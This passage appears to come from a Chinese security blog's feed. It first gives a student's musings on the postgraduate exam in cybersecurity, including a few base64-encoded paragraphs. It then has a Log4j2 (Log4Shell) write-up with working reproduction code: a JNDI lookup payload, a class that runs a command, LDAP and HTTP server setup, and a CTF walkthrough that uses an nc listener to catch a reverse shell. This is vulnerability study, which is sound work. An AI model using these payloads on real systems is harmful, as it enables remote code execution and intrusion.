title="分类"></a>分类</h3><p>研究生分为博研和硕研，博研是要继续深入，侧重于理论和研究方面；硕研三偏向于技巧，更多是面向工作方面，据师傅说大部分都是硕研，多半考上后一两年就工作去了。而导师也是不同的，导师的选择也是重要的一个方面，也不用看电视上讲某某大学研究生因导师太过xx而怎么怎么样，这只是极个别的，大多数导师都是很不错的，不能因为个例而去否认一个群体。</p><h3 id="相关情况"><a href="#相关情况" class="headerlink" title="相关情况"></a>相关情况</h3><p>每年12月25日左右进行考研初试，根据每个学校考研的科目不同分数也不同，网络安全例如哈工大，满分500分，分为数学(150分)，英语(100分·不考听力)，政治(100分)，还有专业课(150分)。</p><h4 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h4><p>数学150分，分为数一数二数三，其中高等数学均考察，且所占比重最大，数一数三中所占比例56%，数二达到了78%。</p><p>数一包括高数上下，线性代数和概率论，数二不考概率论，一般不考数三 &#x3D; &#x3D;。</p><p>21级填空选择分值由4分增加至5分。</p><h4 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h4><p>英语分英一英二英三，从难到简单，各类型题目占比不同。</p><p>完形填空10分，阅读40分，新题型10分</p><p>翻译英一10分，英二15分</p><p>写作小作文10分，英一大作文20分，英二大作文15分</p><p>插曲：在向我一位室友询问考研情况时我做了他一套考研英语卷，就举单选的栗子，感觉都明白句意，但是选项的词意不明白，个人感觉。</p><p>就前期发布的问卷和询问的结果而言，英语六级是接近考研英语的水平，但是考研英语稍微难一些，如果四级都没过的话一定要重视英语，真的没那么简单。不恰当的比较：差不多英语六级425&lt;&#x3D;考研60，四级都没过去考研纯属就是去玩玩的，这是个很不负责的比较，会得罪很多人，很抱歉我没有其他意思，就是希望大家重视一下英语，勿喷&#x3D; &#x3D;。</p><h4 id="专业课"><a href="#专业课" class="headerlink" title="专业课"></a>专业课</h4><p>有很多代名词，比如408，837，分别指考的科目，具体意义就是科目对应的编号</p><p>举20级哈工大网安研究生例子，837考试，考试时间180分钟，150分。包括计算机网络（60分）、信息安全基础（45分）和网络安全基础（45分）三个部分。</p><p>难度 计网 &gt; 信安基础 ≈ 网安基础</p><p>21级工大本部网安缩招，仅招收11人，过复试线15人</p><p>再举408考试例子，科目数据结构，计算机组成原理，计算机网络基础，操作系统。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先，当然我是在纸上谈兵，直言，因为在写这篇文章前我没有考研打算，为了写这篇文章做了很多调查，询问了很多师傅。</p><p>以下言论皆为妄言，我本人说话较直，所作所为皆为后代学弟学妹参考，为其发展考虑，绝无他意，望各位明白，言语不当之处望各位谅解，抱歉了。</p><p>我觉得，考一个非985&#x2F;211的普通一本研究生是比较容易的，考研学校专业的难易度与其名声非正比，比如北航计算机专业分贼高，因为它就收比如说10人，你报了一堆人，那也只能取这么多，所以分数线就高了。比如说我分低，但我报的学校专业没人报，那你就捡了漏，所以说也是有一定运气成分。</p><p>举个19级前辈的例子，六级大二425压线过，第一次考研失败，第二次初试复试第一388上了哈工大信息安全专业，专业课837考了135分。</p><p>21级网安国家线263分，而某大学21级网安空间安全专业考政治，数一，英一和807，复试数据结构，招生21人，复试线就是263分，当年录取最低分264分，最后招入9人，因为只报了9个人…因为没人报所以分数非常低。</p><p>来算一帐，假使英语六级飘过水平，英语政治全考60，数学考低点考个100分，这样已经220分了，专业课满分150分只要考44分就足够了，当然这是我在吹牛，只是想说如果平时成绩不错的话考个一般本科研究生其实是比较容易的，当然是纸上谈兵，还得看个人。</p><h2 id="我为什么-之前-不打算考研"><a href="#我为什么-之前-不打算考研" class="headerlink" title="我为什么(之前)不打算考研"></a>我为什么(之前)不打算考研</h2><p>以下都是个人的自我分析</p><p>看门见山，我一直秉持着之前提到的看法，本科毕业有一定能力进入一家企业单位就可以工作，计算机专业不愁找不到工作，都是在为更好的生活而努力，而且就计算机专业的要求而言，技术水平，能力，经验大部分来说是大于学历的。从长远来说，高学历可能以后会有一定的优势，不过那是未来目标考虑的了。</p><p>如果考研的话，势必要浪费掉半年到一年的时间，而计算机专业几个月甚至不到一月不碰代码可能就已经落后一步了，半年可能已经落后一个时代了(计算机内的时代)。</p><p>一个重要的点：考不上(此点后续会再说)。人分两类，一种是适合学习的，另一种是适合在工作中学习的。就像之前的两类人，一种是目标驱动型的，一种是任务驱动型的，我之前自我定位是任务驱动型的，可能 在企业里完成一个个任务，做一个个项目，这样提升自我可能会更快一些，又可以不让自己那么痛苦，拖着自己的事情却不做，内心十分痛苦。当然也不是说任务驱动型不适合考研，只是目标驱动型在大学内完成一个个目标，为一个个目标而奋斗努力，甚至可以盯着一个需要几年努力才能实现的目标努力，我是十分羡慕这样的人的。(拖延症的内心痛)</p><p>第二个重要的点：生活中诱惑太多。如果我能考上211大学，那我肯定会上的，但是我觉得我考不上这种比较好的研究生。不是说智商不行或者是学习能力不行，而是我的生活中有太多考研之外的事，来分摊我的时间与精力。比如我网工专业往往都是全天满课，很难抽出时间复习，我平时喜欢写写自己的项目，看看最近的实事，最新的漏洞，最近的比赛，还要打最近的比赛，做项目，做课设，写报告等等等等。很多事情都是有周期的，对于年轻人来说一年半载的时间就会让自己和以前的自己完全脱节，习惯是很久养成的，就算你告诉我这些习惯不好，我也不会相信。或者我心里愿意放弃这些，努力考研，但是肉体上也做不到，如果我奔着211大学去了，就要放弃这一切，就我的水平可剩下的时间都不够，况且还有其他的安排。</p><p>我相信一个人的知识水平是一点点积累起来，而不是用一段时间革自己的命，不是用两年时间换一个研究生再享乐，在安稳的玩。研究生是留给那种能长时间在一个专业钻研的人上的，我不是。</p><p>第三个重要的点：考上了又如何(非杠)。作为一个计算机专业的学生，我还是希望我是做一个综合性人才而不是专才，当然我可能也没能力做 &#x3D; &#x3D;。我在各个领域都有一些好奇心，但是还达不到能做学问的程度。有人说现在研究生出来都找不到工作，计算机专业可并非如此，网安方面更是，只要你敢说你是搞网安的，就有人敢要你。</p><p>第四个点：高学历不一定有那么重要。就像我之前说的，科技进步大背景下，社会变动大，你入职场一定时间后并不会有过多人关注你的学历，而是关注你的经历和能力。</p><p>现在所拥有的可能会是未来前进路上的绊脚石，再好的学校也有摆烂的，再差的学校也有优秀学生，本科生和研究生在这上面是没多大区别的，只是一个群体的概念。</p><h2 id="我为什么动摇了"><a href="#我为什么动摇了" class="headerlink" title="我为什么动摇了"></a>我为什么动摇了</h2><p>此部分在我写这篇文章前根本不存在…</p><p>乞儿求温饱，商贾祈财亨，王公祭祚希万世千秋。若把以上三个例子的选择打乱随机分配，估计有的会饿死，有的会造反，有的被杀头。所处环境不同导致观念不同进而导致选择不同。</p><p>以下所说的皆为真心所言。</p><h3 id="情况"><a href="#情况" class="headerlink" title="情况"></a>情况</h3><p>随着我不断深入调查考研情况和学校情况，我发现 我所处的境地有些糟糕…</p><h4 id="我有什么考研的理由"><a href="#我有什么考研的理由" class="headerlink" title="我有什么考研的理由"></a>我有什么考研的理由</h4><ol><li>学校差距</li></ol><p>我们学校是三流民办本科，并不是说它不好，我们学校聘请了很多东南等大学的老师来上课，师资力量还是很雄厚的，我很感谢学校给了我优质的学习环境。</p><p>5o2u5oiR6LCD5p+l55qE5oOF5Ya177yMMjHlubTmiJHku6zpmaLlhbHlm5vnmb7lpJrkurrogIPnoJTvvIzmnIDlkI7ku4XmnIkxNOS6uuiAg+S4iu+8jOiAjOWFtuWunuato+W4uOaZrumAmuS4gOacrOW5tuS4jeaYr+WkqumavuiAg++8jOW+iOWkmuadpeeahOWtpuagoeeahOaWsOeUn+mDveaYr+S4jeW+l+W&#x2F;l+eahOagt+WtkO+8jOWmguaenOaDs+aPkOWNh+iCr+WumuS4jeS8muaUvuW8g+i&#x2F;meadoei3r++8jOWPquacieS4pOenjeino+mHiu+8jOS4gOaYr+ayoeacieWvueiHqui6q+iDveWKm+WBmuWQiOeQhueahOivhOS8sO+8jOS6jOaYr+Wbm+W5tOaUueWPmOS6huS4gOS4quS6uueahOS5oOaAp+OAgueci+WIsOi&#x2F;meaIkeehruWunua3sea3seaEn+WPl+WIsOS6humZouagoeeahOW3rui3ne+8jOi&#x2F;meS5n+aYr+WKqOaRh+aIkeaDs+azleeahOacgOWkp+WboOe0oOS5i+S4gOOAgg&#x3D;&#x3D;</p><p>所以我还是想提升一下自己的学历，哪怕只是一个普通的一本研究生。</p><ol start="2"><li>成绩还行</li></ol><p>我个人成绩还行，有一定的自律性，平时上课比较认真，英语六级425压线过，数学一般，专业课不错，也拿过校奖学金。学科竞赛的话在网安方面 校级省级国家级国际级都拿过奖，虽说不多，但是应该是足够的，可以拼一拼。</p><ol start="3"><li>普通一本研究生不是太困难</li></ol><p>根据我的调查，有不少一本大学研究生网安专业只要过国家线就要你，就我纸上谈兵算一下是很有希望的，如果我不冲211这样的名校，只是为了提升最终学历，我觉得是很不错的选择。网安专业正处于专业红利当中，大量院校正在扩招，很多其他专业的考生（跨考生）并不知道，分数相比于传统计算机专业来说非常低，而随着考研逐年越来越难的趋势，赶紧通过网安专业上岸一个名校可谓是机不可失时不再来。</p><ol start="4"><li>资源吸引</li></ol><p>和圈子内的很多师傅聊聊，发现他们的学校设备环境之类的都比我们要好，我们学校在同等次学校内的环境已经算上等了，但是我希望能找到个更好的环境，认识更多的师傅，加上硬件资源，导师资源，人脉资源等等。做技术的不能只关注于技术，拓展其他领域其他专业的人脉也是个人发展不可或缺的一部分。</p><ol start="5"><li>环境影响</li></ol><p>卷王太多了 &#x3D; &#x3D;。被环境带的…其实是在校外我认识了很多大师傅，包括打比赛认识的，社会战队队伍内的等等，尤其是在社会联合战队内，结识到了全国各地志同道合的优秀师傅们，然而接触到的人多了自然也就加深了我对他们学校的印象，我发现他们很多的院校非常的优异，师傅们的实力也很强劲，我个人的院校较为普通，所以我也想去名校看看。</p><ol start="6"><li>圈外的认可</li></ol><p>虽说很不情愿，但受家人和亲戚朋友的影响，都属于圈外人，他们不搞技术，评判你往往都是根据你的院校来判断，虽然我并不是很在乎他们的眼光，也不在意要不要获取他们的认可，但是如果有可能的话，可以为我带来更多机遇，这是工作无法带来的资源和优势。</p><h4 id="我有什么顾虑"><a href="#我有什么顾虑" class="headerlink" title="我有什么顾虑"></a>我有什么顾虑</h4><ol><li>校内情况</li></ol><p>目前我是我校网安战队队长，所承担的事务繁重，我还在校外负责一个社会联合战队的事务，校外战队可以和师傅们商量一下，师傅们也会理解，校内的情况很不好办，况且这届情况有些不好，很可能会滑铁卢，我个人集体荣誉感比较重，不太能放心。(老师也不可能放过我&#x3D; &#x3D;，开个玩笑，我们这届没什么拿得出手的强项，我都是校队web的顶梁柱，太菜了)</p><ol start="2"><li>技术</li></ol><p>考研就意味着我至少半年可能不会再碰技术了，网安方面哪怕一个月，技术水平绝对会大幅降低跟不上圈子的发展，要花半年时间在应试教育上，我的技术能在<strong>之后</strong>跟得上吗？画个大大的问号</p><ol start="3"><li>风险</li></ol><p>考研是有风险的，我们学校没有保研名额，如果我没考上我的技术绝对跟不上时代，这是我无法接受的，万一我没考上怎么办？到时候进好一点的厂也是困难，我还能进我满意的公司吗？这又是个大大的问号</p><ol start="4"><li>社会因素</li></ol><p>研究生出来同学和朋友都已经工作买房实现财富自由了，可能会把我羡慕死（23333）。研究生我肯定会认真学习的，虽说我的考研目的就是为了提升学历，但我还是会努力完成学业，如果读研期间的导师很差怎么办？如果我的自由时间很少怎么办？读研出来专业红利没了怎么办？这些又是一堆问号</p><p>6L+Y5pyJ5bCx5piv55S35aWz5pa56Z2i55qE6Zeu6aKY77yM5L2c5Li655S355Sf77yM5pyq5p2l6IKv5a6a5b6X6LWa6ZKx5YW75a6277yM5YyF5ous5oi&#x2F;6LS36L2m6LS36L+Z5Lqb5pyJ5Lqb5LmF6L+c5bCx5YWI5LiN6K+077yM5aWz55Sf55qE6K+d56Gu5a6e5Y+v5Lul5om+5Liq5pyJ6ZKx5Lq65auB5Ye65Y6777yM6L+Z5qC35Lmf5Y+v5Lul5LiN55So5Yqq5Yqb5LqG77yM5byA546p56yR77yM5aaC5p6c6L+Z5q615L2&#x2F;5oKo5oSf6KeJ5LiN5oSJ5b+r5oiR5oOz5oKo6YOR6YeN6YGT5q2J77yM5oiR6L+Z6YeM5LiN5oOz5omT5ouz77yM5q+V56uf6L+Z5piv5a6i6KeC56S+5Lya6Zeu6aKY77yM5bC9566h5by66LCD55S35aWz5bmz562J77yM5L2G6Iez5bCR5Zyo6L+R5Luj56S+5Lya5LiK5peg5rOV5pS55Y+Y55qE5LiA5Lqb5Zug57Sg56Gu5a6e5a2Y5Zyo44CC5L2c5Li65oiR5Liq5Lq65p2l6K+077yM5pei54S25oiR5pyJ6IO95Yqb5oqK5ZG96L+Q5o6M5o+h5Zyo6Ieq5bex5omL6YeM77yM5oiR6IKv5a6a5LiN5oS&#x2F;5oSP5Lqk57uZ5LuW5Lq644CC5L2c5Li655S355Sf77yM5b6X5Li75Yqo5om&#x2F;5ouF6LW36L+Z5Liq6LSj5Lu777yM5om&#x2F;5ouF5aSq5LmF6L+c6YKj5bCx5b6X5YWI6ICD6JmR5Yiw6L+Z5LiA5bGC5Zug57Sg</p><ol start="5"><li>付出与收获</li></ol><p>有些时候有人会说“年轻就是要冲一冲，不让我做以后还是会后悔，做了失败了也就释然了”。但考研没那么简单，虽然是个小决定，拼一拼不仅拼的是自己的一年时间，考上了还要包含读研的时间，考不上就还要包含个人的未来方向，还有包括家庭&#x2F;配偶，以及家庭情况(资本)能不能支撑我考研等等。</p><p>5b6I5aSa5aSn5Y6C5LiN6KaB6ICD56CU5LqM5oiY5aSx6LSl55qE77yM55Sa6Iez5Y+v6IO95LuO5YOP5oiR5LiA5qC35pmu6YCa5pys56eR5Ye65p2l77yM6ICD56CU5aSx6LSl55qE6YO95b6I6Zq+5YaN6L+b5aSn5Y6C5LqG44CC5q+V56uf6L+Z5p2h6Lev5b6I5Ye26Zmp77yM6ICD56CU5ZKM5bel5L2c6YO95piv5aaC5q2k</p><ol start="6"><li>动力</li></ol><p>考研的动力很大程度上决定能不能考上研，毕竟动力驱动行动，说白了就是考研为了什么？以我们学校为例，计算机院我们这届一共大概五百到六百人，我们这届考研群(学校官方的)内就有近三百人了。这三百人 有学了三年没学到东西所以想考研碰运气的，有想搏一搏说不定就能碰上的，有被家里面逼迫的，有逃避就业的。大家都知道考研好，毕竟学历比本科高了一个层次，那这么多人考研真的是想去做研究，想为了自己的目标努力奋斗，还是没有目标也知道自己找不到工作所以再苟一年说是准备考研得过且过。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>写这篇文章前没有任何考研打算，现在反而纠结了…我物色了一些好的院校，专业分数都是很低的，但是毕竟还是看专业走，而且我的目的也只是提升下我现在的目前学历，没打算冲击名校，所以压力会小点。但我的校内情况是最棘手的方面，我不能轻易做出决定。</p><p>如果我以后更新了会在下面用分割线或者直接在内容里更新的，写这篇文章原本是为了说明下我个人考研的算法，可我现在却纠结了，实在抱歉，如果这篇文章对你有任何帮助也请不要吝啬你的想法，可以在底下评论告诉我，如果有任何建议和想说的话也可以评论，这篇文章的评论我会一一阅读回复的，感谢大家。</p><p>差不多就这样。</p><hr><p>12月26日：考研差不多快结束了，学校里又少了不少人</p><p>今年的英语翻译很有意境。</p><p>即便尽其所能，亦未必如初愿。如举笔画物，光有明暗，画制于材，技艺有所不能，虽心之所愿，然下笔仍有憾。</p><hr><p>年后更新：博主决定要好好学习技术了，可能对我来说考研也是为了找工作，这段时间也参考了很多其他师傅的想法，我觉得我个人还是希望在工作中体现自我价值，所以说决定继续学习技术，争取进一个大厂。也期望所有的同学们能够不负韶华，尽己所能，坚持自己的道路，祝好！</p><hr><p>4月更新：金三银四，金三已经过去了，很不幸在我第一次找实习就遇到了互联网寒冬，各单位大裁员，缩紧hc，很难，调整调整心态吧。上面补充了一些新内容，也是最近最新的感悟。</p><hr><h2 id="最后更新-2022年4月8日"><a href="#最后更新-2022年4月8日" class="headerlink" title="最后更新 2022年4月8日"></a>最后更新 2022年4月8日</h2>]]></content>
      
      
      <categories>
          
          <category> 碎碎念 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Log4j2 RCE漏洞代码浅析</title>
      <link href="article/log4jrce/"/>
      <url>article/log4jrce/</url>
      
        <content type="html"><![CDATA[<p>开摸</p><span id="more"></span><img src="/article/log4jrce/4E32FA68A576C51928C018DCF51FA1C9.jpg" class="" title="4E32FA68A576C51928C018DCF51FA1C9" loading="lazy"><p>Log4j2是一个基于Java的日志框架，Apache Log4j的重构版本。新增的 Lookups 方法设计用于通过多种途径动态引入外部变量，log4j2版本 &lt; log4j-2.15.0-rc2 可由JNDI注入实现远程代码执行。</p><p>转载请注明本文作者和地址。</p><hr><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>新建maven项目</p><img src="/article/log4jrce/image-20211210205230894.png" class="" title="image-20211210205230894" loading="lazy"><h3 id="创建完后"><a href="#创建完后" class="headerlink" title="创建完后"></a>创建完后</h3><img src="/article/log4jrce/image-20211210205154269.png" class="" title="image-20211210205154269" loading="lazy"><h3 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h3><pre class="language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.apache.logging.log4j&lt;&#x2F;groupId&gt;&lt;artifactId&gt;log4j-core&lt;&#x2F;artifactId&gt;&lt;version&gt;2.14.1&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;&lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;org.apache.logging.log4j&#x2F;log4j-api --&gt;&lt;dependency&gt;&lt;groupId&gt;org.apache.logging.log4j&lt;&#x2F;groupId&gt;&lt;artifactId&gt;log4j-api&lt;&#x2F;artifactId&gt;&lt;version&gt;2.14.1&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;</code></pre><img src="/article/log4jrce/image-20211210205406063.png" class="" title="image-20211210205406063" loading="lazy"><h3 id="新建两个class"><a href="#新建两个class" class="headerlink" title="新建两个class"></a>新建两个class</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token comment">/* *    @Author: Err0r *    @date : 2021/12/10 *    @file : log4j */</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> log4j <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>log4j<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"$&#123;jndi:ldap://127.0.0.1:1389/Log4jRCE&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token comment">/* *    @Author: Err0r *    @date : 2021/12/10 *    @file : Log4jRCE */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Log4jRCE</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> var0 <span class="token operator">=</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var1<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><img src="/article/log4jrce/image-20211210210755065.png" class="" title="image-20211210210755065" loading="lazy"><h3 id="开启http服务"><a href="#开启http服务" class="headerlink" title="开启http服务"></a>开启http服务</h3><pre class="language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> http.server <span class="token number">8888</span></code></pre><img src="/article/log4jrce/image-20211210210848125.png" class="" title="image-20211210210848125" loading="lazy"><h3 id="到一个新的文件夹准备服务"><a href="#到一个新的文件夹准备服务" class="headerlink" title="到一个新的文件夹准备服务"></a>到一个新的文件夹准备服务</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git@github.com:mbechler/marshalsec.git</code></pre><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><pre class="language-bash" data-language="bash"><code class="language-bash">mvn clean package <span class="token parameter variable">-DskipTests</span></code></pre><h3 id="上服务"><a href="#上服务" class="headerlink" title="上服务"></a>上服务</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token string">"http://127.0.0.1:8888/#Log4jRCE"</span></code></pre><img src="/article/log4jrce/image-20211210211207737.png" class="" title="image-20211210211207737" loading="lazy"><p>运行log4j.java</p><img src="/article/log4jrce/image-20211210212715616.png" class="" title="image-20211210212715616" loading="lazy"><h2 id="0x02-流程分析"><a href="#0x02-流程分析" class="headerlink" title="0x02 流程分析"></a>0x02 流程分析</h2><p>菜鸡蹩脚调试了半天，不知是否正确，还请大师傅们批评指正。</p><p>首先是一系列初始化操作，然后是我们的poc作为message传入<code>logMessage</code>(AbstractLogger.java)</p><img src="/article/log4jrce/image-20211210213200746.png" class="" title="image-20211210213200746" loading="lazy"><img src="/article/log4jrce/image-20211210213243728.png" class="" title="image-20211210213243728" loading="lazy"><p>然后进入<code>logMessageSafely</code></p><img src="/article/log4jrce/image-20211210213339178.png" class="" title="image-20211210213339178" loading="lazy"><p>接着进入<code>logMessageTrackRecursion</code></p><img src="/article/log4jrce/image-20211210213713378.png" class="" title="image-20211210213713378" loading="lazy"><p>指向<code>tryLogMessage</code></p><img src="/article/log4jrce/image-20211210213738925.png" class="" title="image-20211210213738925" loading="lazy"><p>再走到LoggerConfig的<code>log</code></p><img src="/article/log4jrce/image-20211210214044470.png" class="" title="image-20211210214044470" loading="lazy"><p>由<code>processLogEvent</code>来判定Event</p><img src="/article/log4jrce/image-20211210214104131.png" class="" title="image-20211210214104131" loading="lazy"><img src="/article/log4jrce/image-20211210214154131.png" class="" title="image-20211210214154131" loading="lazy"><p>在一系列跟进后发现了个<code>toSerializable</code>，里面用了它的format方法</p><img src="/article/log4jrce/image-20211210214359815.png" class="" title="image-20211210214359815" loading="lazy"><p>里面会对首尾判断是否满足<code>$&#123;xxx&#125;</code>逻辑</p><blockquote><p>&#x2F;&#x2F; TODO can we optimize this? 很皮啊</p></blockquote><p>然后进入了<code>replace</code>,<code>substitute</code></p><img src="/article/log4jrce/image-20211210214639781.png" class="" title="image-20211210214639781" loading="lazy"><img src="/article/log4jrce/image-20211210214738016.png" class="" title="image-20211210214738016" loading="lazy"><p>调用了<code>StrSubtitutor</code>的<code>resolveVariable</code></p><img src="/article/log4jrce/image-20211210214846121.png" class="" title="image-20211210214846121" loading="lazy"><p>通过resolveVariable调用<code>lookup</code></p><img src="/article/log4jrce/image-20211210214939264.png" class="" title="image-20211210214939264" loading="lazy"><p>顺便研究一下<code>lookup</code></p><p>这里</p><pre class="language-none"><code class="language-none">prefix &#x3D; &quot;jndi&quot;name &#x3D; &quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Log4jRCE&quot;lookup &#x3D; &#123;JndiLookup@2064&#125; </code></pre><p>这里从<code>strLookupMap</code>的map里提取了jndi的lookup，然后在jndi的lookup方法里成功开花</p><img src="/article/log4jrce/image-20211210222546722.png" class="" title="image-20211210222546722" loading="lazy"><p><code>return Objects.toString(jndiManager.lookup(jndiName), null)</code></p><p>这里就是<code>jndiManager.lookup(&#39;ldap://127.0.0.1:1389/Log4jRCE&#39;)</code></p><img src="/article/log4jrce/image-20211210222738049.png" class="" title="image-20211210222738049" loading="lazy"><img src="/article/log4jrce/image-20211210222850555.png" class="" title="image-20211210222850555" loading="lazy"><pre class="language-none"><code class="language-none">return super.lookup(var1)</code></pre><p>也就是<code>super.lookup(&#39;ldap://127.0.0.1:1389/Log4jRCE&#39;)</code></p><img src="/article/log4jrce/image-20211210223114820.png" class="" title="image-20211210223114820" loading="lazy"><pre class="language-none"><code class="language-none">var1 &#x3D; &quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Log4jRCE&quot;var2 (slot_2) &#x3D; &#123;ResolveResult@2676&#125; var3 (slot_3) &#x3D; &#123;LdapCtx@2677&#125; </code></pre><p>var2获取remote的class，即跳转到了我们之前编译的<code>Log4jRCE.class</code></p><img src="/article/log4jrce/image-20211210223755936.png" class="" title="image-20211210223755936" loading="lazy"><p>var3实例化，接着var3lookup，加载</p><img src="/article/log4jrce/image-20211210223337687.png" class="" title="image-20211210223337687" loading="lazy"><p>然后就不必多说了，直接执行，遍地开花</p><img src="/article/log4jrce/image-20211210223411156.png" class="" title="image-20211210223411156" loading="lazy"><hr><h2 id="0x03-题目"><a href="#0x03-题目" class="headerlink" title="0x03 题目"></a>0x03 题目</h2><p>在12月10日晚间 <a href="https://ctf.show/challenges#Log4j%E5%A4%8D%E7%8E%B0-1730">ctfshow</a>也上线了该漏洞的复现，利用思路如上，直接拿编译好的jar文件打</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-A</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-C</span> <span class="token string">"[payload]"</span></code></pre><p>记得payload最好base64编码一下，以免出错。</p><p>其实在今年早些时候V&amp;Nctf有道题也是<code>JNDI-Injection-Exploit</code></p><p><a href="https://err0r.top/article/VN2021ctf/?highlight=realezjvav">V&amp;N ctf realezjvav</a></p><blockquote><p>不能说极其相似，只能说一摸一样，今年上半年都有ctf题目了</p><p>一个没被重视的洞，甚至没有CVE编号，终究还是扩大到了堪比永恒之蓝的范围…</p></blockquote><p>我发现我服务器上竟然还有源码，直接打就行了</p><img src="/article/log4jrce/image-20211210224236428.png" class="" title="image-20211210224236428" loading="lazy"><h3 id="1-服务器先起监听"><a href="#1-服务器先起监听" class="headerlink" title="1.服务器先起监听"></a>1.服务器先起监听</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">1234</span></code></pre><img src="/article/log4jrce/image-20211210224502476.png" class="" title="image-20211210224502476" loading="lazy"><h3 id="2-起服务"><a href="#2-起服务" class="headerlink" title="2.起服务"></a>2.起服务</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-A</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-C</span> <span class="token string">"[payload]"</span></code></pre><img src="/article/log4jrce/image-20211210224916380.png" class="" title="image-20211210224916380" loading="lazy"><h3 id="3-干它"><a href="#3-干它" class="headerlink" title="3.干它"></a>3.干它</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token punctuation">[</span>ip<span class="token punctuation">]</span><span class="token operator">:</span><span class="token punctuation">[</span>port<span class="token punctuation">]</span><span class="token operator">/</span><span class="token punctuation">[</span>xxxx<span class="token punctuation">]</span>&#125;</span></code></pre><img src="/article/log4jrce/image-20211210224949536.png" class="" title="image-20211210224949536" loading="lazy"><p>直接弹到shell</p><img src="/article/log4jrce/image-20211210225033795.png" class="" title="image-20211210225033795" loading="lazy"><hr><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/tangxiaofeng7/apache-log4j-poc">https://github.com/tangxiaofeng7/apache-log4j-poc</a></p><p><a 